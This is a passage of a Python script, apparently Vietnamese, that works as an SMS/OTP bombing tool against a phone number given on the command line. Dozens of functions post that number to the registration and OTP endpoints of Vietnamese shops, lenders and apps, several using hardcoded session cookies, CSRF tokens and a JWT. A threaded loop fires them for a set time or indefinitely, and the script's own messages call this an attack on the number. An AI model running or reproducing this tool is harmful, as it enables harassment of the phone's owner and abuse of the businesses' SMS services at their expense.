    data = json.dumps({"phone": f"84{sdt[1:]}"})
    return safe_request(requests.post, "https://api.thantaioi.vn/api/user/send-one-time-password", data=data, headers=headers, timeout=10)

def call9(sdt):
    cookies = {
        'supportOnlineTalkID': 'Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6',
        '__cfruid': 'f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280',
        'XSRF-TOKEN': 'eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY5ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D',
    }
    headers = {
        'authority': 'robocash.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://robocash.vn',
        'referer': 'https://robocash.vn/register',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {'phone': sdt, '_token': 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I'}
    return safe_request(requests.post, 'https://robocash.vn/register/phone-resend', cookies=cookies, headers=headers, data=data, timeout=10)

def concung(sdt):
    headers = {
        "Host": "concung.com",
        "content-length": "121",
        "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://concung.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://concung.com/dang-nhap.html",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "cookie": "_ga_BBD6001M29=GS1.1.1679234342.1.1.1679234352.50.0.0"
    }
    payload = {
        "ajax": "1",
        "classAjax": "AjaxLogin",
        "methodAjax": "sendOtpLogin",
        "customer_phone": sdt,
        "id_customer": "0",
        "momoapp": "0",
        "back": "khach-hang.html"
    }
    return safe_request(requests.post, "https://concung.com/ajax.html", data=payload, headers=headers, timeout=10)

def cafeland(sdt):
    headers = {
        "Host": "nhadat.cafeland.vn",
        "content-length": "65",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://nhadat.cafeland.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://nhadat.cafeland.vn/dang-ky.html",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "cookie": "laravel_session=eyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJmYWNpOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D"
    }
    payload = {"mobile": sdt,"_token": "bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w"}
    return safe_request(requests.post, "https://nhadat.cafeland.vn/member-send-otp/", data=payload, headers=headers, timeout=10)

def moneydong(sdt):
    headers = {
        "Host": "api.moneydong.vip",
        "content-length": "72",
        "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://h5.moneydong.vip",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://h5.moneydong.vip/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    payload = {"phone": sdt[1:], "type": "2", "ctype": "1", "chntoken": "69ad075c94c279e43608c5d50b77e8b9"}
    return safe_request(requests.post, "https://api.moneydong.vip/h5/LoginMessage_ultimate", data=payload, headers=headers, timeout=10)

def call10(sdt):
    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }
    json_data = {'phone': sdt}
    return safe_request(requests.post, 'https://api.dongplus.vn/api/user/send-one-time-password', headers=headers, json=json_data, timeout=10)

def gotadi(sdt):
    headers = {
        "Host": "api.gotadi.com",
        "content-length": "44",
        "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
        "accept": "application/json",
        "sec-ch-ua-platform": "\"Android\"",
        "gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "content-type": "application/json",
        "origin": "https://www.gotadi.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.gotadi.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    data = json.dumps({"phoneNumber": sdt,"language":"VI"})
    return safe_request(requests.post, "https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=data, headers=headers, timeout=10)

def call11(sdt):
    cookies = {
        'OnCredit_id': '643d8607c6ffe8.92935100',
        'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': 'o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=',
        'SN5c8116d5e6183': 'rfsd6jmf1e0daeapvmv1p0i6bu',
    }
    headers = {
        'authority': 'oncredit.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://oncredit.vn',
        'referer': 'https://oncredit.vn/registration',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'data[typeData]': 'sendCodeReg',
        'data[phone]': sdt,
        'data[email]': 'tv5v4v4v4c@gmail.com',
        'data[captcha1]': '1',
        'data[lang]': 'vi',
        'CSRFName': 'CSRFGuard_ajax',
        'CSRFToken': 't8ETz5Y5HFnBefT9dEnDBDe9S4D5RdyEFNKSFDn8b5YSFAB7yr5rD5QZ6b974ARi',
    }
    return safe_request(requests.post, 'https://oncredit.vn/?ajax', cookies=cookies, headers=headers, data=data, timeout=10)

def ahamove(sdt):
    mail = generateRandomString(6) + "@gmail.com"
    headers = {
        "Host": "api.ahamove.com",
        "content-length": "114",
        "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://app.ahamove.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.ahamove.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    data = json.dumps({"mobile": sdt[1:],"name":"Tuấn","email": mail,"country_code":"VN","firebase_sms_auth":"true"})
    return safe_request(requests.post, "https://api.ahamove.com/api/v3/public/user/register", data=data, headers=headers, timeout=10)

def vieon1(sdt):
    headers = {
        "Host": "api.vieon.vn",
        "content-length": "201",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?1",
        "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4",
        "user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://vieon.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://vieon.vn/?utm_source=google&utm_medium=cpc&utm_campaign=approi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite&utm_content=p_--k_vieon&pid=approi&c=approi_VieON_SEM_Brand_BOS_Exact&af_adset=approi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B&af_force_deeplink=false&gclid=CjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    params = {"platform": "mobile_web","ui": "012021"}
    payload = {"phone_number": sdt,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    return safe_request(requests.post, "https://api.vieon.vn/backend/user/register/mobile", params=params, data=payload, headers=headers, timeout=10)

def tiki(sdt):
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
    }
    data = {'phone': sdt}
    return safe_request(requests.post, 'https://tiki.vn/api/v2/customers/otp_codes', headers=headers, json=data, timeout=10)

def apiv5(sdt):
    url = f"https://api.huykaiser.me/API/AUTOSPAM/spam?count=100&phone={sdt}"
    return safe_request(requests.post, url, timeout=10)

def gbay(sdt):
    json_data = {'phone_number': sdt,'hash': generateRandomString(40)}
    return safe_request(requests.post, 'https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data, timeout=10)

def tgdd(sdt):
    cookies = {
        'DMX_Personal': '%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE',
        '_gid': 'GA1.2.2106570071.1685151972',
        '_ga_TLRZMSX5ME': 'GS1.1.1685151972.1.0.1685151972.60.0.0',
        '_ga': 'GA1.1.2004811826.1685151972',
        '_fbp': 'fb.1.1685151972814.1550382232',
        'cebs': '1',
    }
    headers = {
        'authority': 'www.thegioididong.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.thegioididong.com',
        'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8OWsBjKS6DlGsrtmU_sYztIFV_sLQ8iWp7L2ZHjo3-UAquJc6mF7IflJ21rflzBVCTfkVYuNcBYuDIdaZroeLkecOCkjg8RcsK0QvNDv6_w7iP7JTCGaGgWZ4Ybwep7Zt6N6vP8-qJcVUHhSPvjvh_s',
    }
    return safe_request(requests.post, 'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', cookies=cookies, headers=headers, data=data, timeout=10)

def BIBABO(sdt):
    headers = {
        "Host": "bibabo.vn",
        "Connection": "keep-alive",
        "Content-Length": "64",
        "Accept": "/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "Origin": "https://bibabo.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
    }
    payload = {"phone": sdt, "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"}
    return safe_request(requests.post, "https://bibabo.vn/user/verify-phone", headers=headers, data=payload, timeout=10)

def SWIFT247(sdt):
    headers = {
        "Host": "api.swift247.vn",
        "content-length": "23",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://app.swift247.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.swift247.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    data = {"phone": sdt}
    return safe_request(requests.post, "https://api.swift247.vn/v1/checkphone", headers=headers, json=data, timeout=10)

def KILO(sdt):
    headers = {
        "Host": "api.kilo.vn",
        "content-length": "54",
        "app-version": "1",
        "x-correlation-id": "d5afa9c6-73cb-47bf-ad42-0672912b725b",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json",
        "i18next-language": "vi",
        "api-version": "2",
        "platform": "SELLER_WEB",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://seller.kilo.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://seller.kilo.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    email = generateRandomString(6) + "@gmail.com"
    data = json.dumps({"phone": sdt, "email": email})
    return safe_request(requests.post, "https://api.kilo.vn/users/check-new-user", headers=headers, data=data, timeout=10)

def PHUCLONG(sdt):
    headers = {
        "Host": "api-crownx.winmart.vn",
        "content-length": "126",
        "accept": "application/json",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://order.phuclong.com.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://order.phuclong.com.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    data = {
        "phoneNumber": sdt,
        "fullName": "Nguyễn Đặng Hoàng Hải",
        "email": "vexnolove03@gmail.com",
        "password": "Vrxx#1337"
    }
    return safe_request(requests.post, 'https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, json=data, timeout=10)

def VIETLOTT(sdt):
    headers = {
        "Host": "api-mobi.vietlottsms.vn",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "ClientCallAPI": "EMB",
        "deviceId": "",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "/",
        "partnerChannel": "WEB",
        "Identify-Device-Token": "",
        "checkSum": "887e5218c679e1fe26b48cc642532a39909f619868f09d415b7d13cd43784f36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://vietlott-sms.vn",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://vietlott-sms.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    data = {'phoneNumber': sdt}
    return safe_request(requests.post, 'https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber', headers=headers, json=data, timeout=10)

SPAM_FUNCTIONS = [
    vayvnd, tamo, meta, kiot, fpt, alfrescos, poyeye, vieon, tv360, winmart,
    fptplay, funring, apispam, vietid, dkvt, viettel, momo, call1, call2,
    call3, call4, call5, call9, concung, cafeland, moneydong, call10, gotadi,
    call11, ahamove, vieon1, tiki, apiv5, gbay, tgdd, BIBABO, SWIFT247, KILO,
    PHUCLONG, VIETLOTT
]

def run_spam(sdt, duration_seconds):
    """Chạy spam trong khoảng thời gian xác định"""
    print(f"\n{style.YELLOW}Bắt đầu tấn công {sdt} trong {duration_seconds} giây...{style.RESET}")
    print(f"{style.CYAN}Tổng số hàm spam: {len(SPAM_FUNCTIONS)}{style.RESET}")

    start_time = time.time()
    success_count = 0
    fail_count = 0

    with ThreadPoolExecutor(max_workers=50) as executor:
        while time.time() - start_time < duration_seconds:
            try:
                func = random.choice(SPAM_FUNCTIONS)
                future = executor.submit(func, sdt)

                try:
                    result = future.result(timeout=10)
                    if result is not None:
                        success_count += 1
                    else:
                        fail_count += 1
                except:
                    fail_count += 1

                time.sleep(random.uniform(0.1, 0.5))

            except KeyboardInterrupt:
                print(f"\n{style.RED}Đã dừng tấn công!{style.RESET}")
                break
            except Exception as e:
                fail_count += 1
                continue

    total = success_count + fail_count
    success_rate = (success_count / total * 100) if total > 0 else 0

    print(f"\n{style.CYAN}=== KẾT QUẢ ==={style.RESET}")
    print(f"{style.GREEN}Thành công: {success_count}{style.RESET}")
    print(f"{style.RED}Thất bại: {fail_count}{style.RESET}")
    print(f"{style.BLUE}Tổng số: {total}{style.RESET}")
    print(f"{style.YELLOW}Tỷ lệ thành công: {success_rate:.2f}%{style.RESET}")
    
    return success_count, fail_count

def main():
    banner()

    ip = socket.gethostbyname(socket.gethostname())
    th = '- - - - - - - - - - - - - - - - - - - - - - - - -'

    print(style.HEADER + 'SPAM SMS CALL SIÊU MẠNH BY HOANGAL')
    print(style.BLUE + '---------------------------------------')

    # Nhận tham số từ dòng lệnh
    if len(sys.argv) < 2:
        print(f"{style.RED}Cách sử dụng: {sys.argv[0]} <số điện thoại> [thời gian giây]{style.RESET}")
        print(f"{style.YELLOW}Ví dụ: {sys.argv[0]} 0912345678 60{style.RESET}")
        print(f"{style.GREEN}Nếu không chỉ định thời gian, sẽ chạy vô hạn{style.RESET}")
        return
    
    sdt = sys.argv[1]
    
    # Kiểm tra định dạng số điện thoại
    if not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$", sdt):
        print(f"{style.RED}Số điện thoại không hợp lệ!{style.RESET}")
        return
    
    # Kiểm tra tham số thời gian
    duration = None
    if len(sys.argv) >= 3:
        try:
            duration = int(sys.argv[2])
        except ValueError:
            print(f"{style.RED}Thời gian không hợp lệ!{style.RESET}")
            return
    
    print(f"{style.GREEN}Số điện thoại: {sdt}{style.RESET}")
    if duration:
        print(f"{style.GREEN}Thời gian: {duration} giây{style.RESET}")
    else:
        print(f"{style.GREEN}Chế độ: Chạy vô hạn{style.RESET}")
    print(style.BLUE + '---------------------------------------')
    
    # Chạy spam
    try:
        if duration:
            # Chạy trong thời gian xác định
            run_spam(sdt, duration)
        else:
            # Chạy vô hạn
            print(f"{style.YELLOW}Bắt đầu tấn công vô hạn {sdt}...{style.RESET}")
            print(f"{style.CYAN}Tổng số hàm spam: {len(SPAM_FUNCTIONS)}{style.RESET}")
            print(f"{style.RED}Nhấn Ctrl+C để dừng{style.RESET}")
            
            total_success = 0
            total_fail = 0
            cycle_count = 0
            
            while True:
                cycle_count += 1
                print(f"\n{style.MAGENTA}=== Chu kỳ {cycle_count} ==={style.RESET}")
                success, fail = run_spam(sdt, 60)  # Chạy mỗi chu kỳ 60 giây
                total_success += success
                total_fail += fail
                
                print(f"\n{style.CYAN}=== TỔNG KẾT SAU {cycle_count} CHU KỲ ==={style.RESET}")
                print(f"{style.GREEN}Tổng thành công: {total_success}{style.RESET}")
                print(f"{style.RED}Tổng thất bại: {total_fail}{style.RESET}")
                print(f"{style.BLUE}Tổng số yêu cầu: {total_success + total_fail}{style.RESET}")
                
                # Chờ 5 giây trước khi bắt đầu chu kỳ mới
                time.sleep(5)
                
    except KeyboardInterrupt:
        print(f"\n{style.RED}Đã dừng chương trình!{style.RESET}")

if __name__ == "__main__":
    main()
[file content end]